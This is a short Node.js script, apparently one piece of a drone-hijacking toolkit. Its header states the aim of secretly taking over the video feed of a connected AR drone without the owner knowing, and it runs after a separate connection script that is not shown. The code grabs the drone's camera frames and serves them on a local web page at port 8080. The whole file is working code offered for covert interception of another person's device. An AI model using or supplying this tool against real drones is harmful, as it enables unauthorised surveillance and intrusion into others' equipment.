/* Purpose: To hijack the video feed of  the drone you're connected to
 * without the client knowing. This will pull image data from the drone
 * and can be viewed over 127.0.0.1:8080 in a local web browser. The page
 * must be refreshed to update the image, or spam f5 to get a video.
 *
 * Must be run after connectToDrone.sh in lib/ and will work with or
 * without flight control.
 *
 * Syntax: sudo node video.js
 *
 */
var arDrone = require('ar-drone');
var http    = require('http');

console.log('Connecting png stream ...');

var pngStream = arDrone.createClient().getPngStream();

var lastPng;
pngStream
  .on('error', console.log)
  .on('data', function(pngBuffer) {
    lastPng = pngBuffer;
  });

var server = http.createServer(function(req, res) {
  if (!lastPng) {
    res.writeHead(503);
    res.end('Did not receive any png data yet.');
    return;
  }

  res.writeHead(200, {'Content-Type': 'image/png'});
  res.end(lastPng);
});

server.listen(8080, function() {
  console.log('Serving latest png on port 8080 ...');
});

